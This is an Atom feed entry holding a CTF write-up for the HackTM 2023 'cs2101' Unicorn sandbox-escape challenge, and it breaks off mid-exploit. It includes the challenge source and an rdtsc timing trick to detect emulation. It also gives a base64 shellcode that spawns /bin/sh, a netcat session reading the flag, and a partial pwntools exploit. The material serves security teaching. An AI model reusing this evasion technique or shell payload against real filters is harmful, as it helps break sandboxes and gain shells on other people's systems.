<?xml version="1.0" encoding="utf-8"?> 
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[linux on repr]]></title>
    
        <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
    
    
    
            <link href="https://nasm.re/tags/linux/" rel="alternate" type="text/html" title="HTML" />
            <link href="https://nasm.re/tags/linux/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
    <updated>2023-05-23T23:50:29+02:00</updated>
    
        <author>
            <name>nasm</name>
            
                <email>nasm@pm.me</email>
            </author>
        
    <id>https://nasm.re/tags/linux/</id>
        
        <entry>
            <title type="html"><![CDATA[[HackTM finals 2023 - pwn] cs2101]]></title>
            <link href="https://nasm.re/posts/cs2101/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/cs2101/</id>
            
            <published>2023-05-15T00:00:00+00:00</published>
            <updated>2023-05-15T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="cs2101">
        cs2101
        <a data-clipboard-text="https://nasm.re/posts/cs2101/#cs2101" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor cs2101" href="#cs2101">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p><code>cs2101</code> is shellcoding / unicorn sandbox escape challenge I did during the <a
  class="gblog-markdown__link"
  href="https://ctfx.hacktm.ro/home"
  
  >HackTM finals</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="what-we-have">
        What we have
        <a data-clipboard-text="https://nasm.re/posts/cs2101/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The challenge is splitted into three file: the server, the unicorn callback based checker and the final C program that runs the shellcode without any restrictions. Let&rsquo;s take a look at the server:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">tempfile</span>
<span class="kn">from</span> <span class="nn">sc_filter</span> <span class="kn">import</span> <span class="n">emulate</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">encoded</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter your base64 encoded shellcode:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="n">encoded</span><span class="o">+=</span> <span class="s1">&#39;=======&#39;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Error decoding your base64&#34;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">emulate</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;I&#39;m not letting you hack me again!&#34;</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">()</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> 
        <span class="n">f</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

        <span class="n">name</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">name</span>
        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;./emulate </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
        


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div><p>The server is asking for a shellcode encoded in base64, then it is checking some behaviours of the shellcode by running it into unicorn through the <code>emulate</code> function and if it does not fail the shellcode is run by the <code>emulate</code> C program. Now let&rsquo;s take a quick look at the unicorn checker:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">from</span> <span class="nn">unicorn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">unicorn.x86_const</span> <span class="kn">import</span> <span class="o">*</span>


<span class="c1"># memory address where emulation starts</span>
<span class="n">ADDRESS</span> <span class="o">=</span> <span class="mh">0x1000000</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;sc.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">code</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">emulate</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done emulating. Passed!&#34;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Done emulating. Failed!&#34;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">emulate</span><span class="p">(</span><span class="n">code</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Initialize emulator in X86-64bit mode</span>
        <span class="n">mu</span> <span class="o">=</span> <span class="n">Uc</span><span class="p">(</span><span class="n">UC_ARCH_X86</span><span class="p">,</span> <span class="n">UC_MODE_64</span><span class="p">)</span>

        <span class="c1"># map memory</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">mem_map</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span>

        <span class="c1"># shellcode to test</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>

        <span class="c1"># initialize machine registers</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_X86_REG_RAX</span><span class="p">,</span> <span class="n">ADDRESS</span><span class="p">)</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">reg_write</span><span class="p">(</span><span class="n">UC_X86_REG_RFLAGS</span><span class="p">,</span> <span class="mh">0x246</span><span class="p">)</span>

        <span class="c1"># initialize hooks</span>
        <span class="n">allowed</span> <span class="o">=</span> <span class="p">[</span><span class="kc">True</span><span class="p">]</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_INSN</span><span class="p">,</span> <span class="n">syscall_hook</span><span class="p">,</span> <span class="n">allowed</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">UC_X86_INS_SYSCALL</span><span class="p">)</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">hook_add</span><span class="p">(</span><span class="n">UC_HOOK_CODE</span><span class="p">,</span> <span class="n">code_hook</span><span class="p">,</span> <span class="n">allowed</span><span class="p">)</span>

        <span class="c1"># emulate code in infinite time &amp; unlimited instructions</span>
        <span class="n">mu</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="n">ADDRESS</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">allowed</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>

    <span class="k">except</span> <span class="n">UcError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERROR: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">e</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">syscall_hook</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="c1"># Syscalls are dangerous!</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not allowed to use syscalls&#34;</span><span class="p">)</span>
    <span class="n">user_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>


<span class="k">def</span> <span class="nf">code_hook</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="n">inst</span> <span class="o">=</span> <span class="n">mu</span><span class="o">.</span><span class="n">mem_read</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>

    <span class="c1"># CPUID (No easy wins here!)</span>
    <span class="k">if</span> <span class="n">inst</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0f\xa2</span><span class="s1">&#39;</span><span class="p">:</span>
        <span class="n">user_data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;CPUID&#34;</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div><p>To succeed the check in the server our shellcode should match several conditions: first there should not be any syscalls / <code>cpuid</code> instructions, then it should exit (and return allowed[0] === true) without triggering an exception not handled by unicorn (for example <code>SIGSEGV</code> or an interrupt not handled like <code>int 0x80</code>. And if it does so the shellcode is ran by this program:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="cp">#define ADDRESS ((void*)0x1000000)
</span><span class="cp"></span>
<span class="cm">/* gcc emulate.c -o emulate -masm=intel */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;filename&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">code</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="n">ADDRESS</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span>
                      <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="o">|</span> <span class="n">PROT_EXEC</span><span class="p">,</span>
                      <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">code</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;mmap&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="n">__asm__</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">&#34;lea rcx, [rsp-0x1800]</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;fxrstor [rcx]</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor rbx, rbx</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor rcx, rcx</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor rdx, rdx</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor rdi, rdi</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor rsi, rsi</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor rbp, rbp</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor rsp, rsp</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor r8, r8</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor r9, r9</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor r10, r10</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor r11, r11</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor r12, r12</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor r13, r13</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor r14, r14</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;xor r15, r15</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="s">&#34;jmp rax</span><span class="se">\n\t</span><span class="s">&#34;</span>
        <span class="o">:</span>
        <span class="o">:</span> <span class="s">&#34;a&#34;</span> <span class="p">(</span><span class="n">code</span><span class="p">)</span>
        <span class="o">:</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>If we succeed to run the shellcode within this program we could easily execute syscalls and then drop a shell.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="bypass-the-sandbox">
        Bypass the sandbox
        <a data-clipboard-text="https://nasm.re/posts/cs2101/#bypass-the-sandbox" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Bypass the sandbox" href="#bypass-the-sandbox">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>The first step is to make our shellcode aware of the environment inside which it is running. A classic trick to achieve this is to use the <code>rdtsc</code> instruction (<a
  class="gblog-markdown__link"
  href="https://www.felixcloutier.com/x86/rdtsc"
  
  >technical spec here</a
>). According to the documentation, it:</p>
<blockquote>
<p>Reads the current value of the processor’s time-stamp counter (a 64-bit MSR) into the EDX:EAX registers. The EDX register is loaded with the high-order 32 bits of the MSR and the EAX register is loaded with the low-order 32 bits. (On processors that support the Intel 64 architecture, the high-order 32 bits of each of RAX and RDX are cleared.)</p>
</blockquote>
<p>Given within a debugger / emulator (depends on what is hooked actually, in an emulator it could be easily handled) the time between the execution of two instructions is very long we could check that the shellcode is ran casually by the C program without being hooked at each instruction (as it is the case in the unicorn sandbox) just by checking that the amount of time between two instructions is way shorter than in the sandbox. This way we can trigger a different code path in the shellcode according to the environment inside which it is run.</p>
<p>The second step is about being able to leave the sandbox without any syscalls with a handled exception that will not throw an error. By reading the unicorn source code for a while I saw a comment that talked about the <code>hlt</code> instruction, then I tried to use it to shutdown the shellcode when it is run by the sandbox and it worked pretty good.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/cs2101/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Putting it all together we manage to get the flag:</p>
<pre tabindex="0"><code>[root@(none) chal]# nc 34.141.16.87 10000
Enter your base64 encoded shellcode:
DzFJicBIweIgSQnQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQDzFJicFIweIgSQnRTSnBSYH5AAEAAH8JSMfAagAAAf/g9EjHxAAAAAFIgcQABQAAamhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F
id
uid=1000(user) gid=1000(user) groups=1000(user)
ls
emulate
flag.txt
requirements.txt
run
sc_filter.py
server.py
cat flag.txt
HackTM{Why_can't_you_do_your_homework_normally...}
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="final-exploit">
        Final exploit
        <a data-clipboard-text="https://nasm.re/posts/cs2101/#final-exploit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Final exploit" href="#final-exploit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Final epxloit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&#34;emulate&#34;</span>
<span class="n">LIBC</span> <span class="o">=</span> <span class="s2">&#34;/usr/lib/libc.so.6&#34;</span>
<span class="n">LD</span> <span class="o">=</span> <span class="s2">&#34;/lib64/ld-linux-x86-64.so.2&#34;</span>

<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LIBC</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">LD</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">p64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span>
<span class="n">u64</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span>
<span class="n">p32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span>
<span class="n">u32</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u32</span>
<span class="n">p16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p16</span>
<span class="n">u16</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u16</span>
<span class="n">p8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p8</span>
<span class="n">u8</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u8</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>

<span class="n">FILENAME</span> <span class="o">=</span> <span class="s2">&#34;shellcode&#34;</span>

<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;shellcode&#34;</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="kn">import</span> <span class="nn">base64</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;shellcode&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>

    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span> 
        <span class="s2">&#34;rdtsc</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;mov r8, rax</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;shl rdx, 32</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;or r8, rdx</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
        <span class="s2">&#34;nop</span><span class="se">\n</span><span class="s2">&#34;</span>
